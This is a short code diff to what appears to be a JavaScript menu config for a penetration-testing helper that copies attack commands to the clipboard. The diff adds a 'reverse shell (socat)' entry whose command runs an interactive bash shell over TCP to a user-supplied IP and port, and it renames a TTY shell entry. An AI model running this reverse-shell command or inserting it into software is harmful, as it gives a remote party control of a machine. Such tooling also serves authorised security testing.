@@ -63,7 +63,17 @@ export default {/* eslint-disable max-len */
             condition: () => true
         }
     ],
-    'spawn a TTY shell (linux)': [
+    'reverse shell (socat)': [
+        {
+            text: 'Copy command to clipboard',
+            task: async ({escaped, ip, port}) => {
+                const cmd = `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${ip}:${port}`;
+                await clipboard.write(escaped ? wrapWithQuotes(cmd) : cmd);
+            },
+            condition: () => true
+        }
+    ],
+    'spawn a TTY shell (python)': [
         {
             text: 'Copy command to clipboard',
             task: async ({escaped}) => {
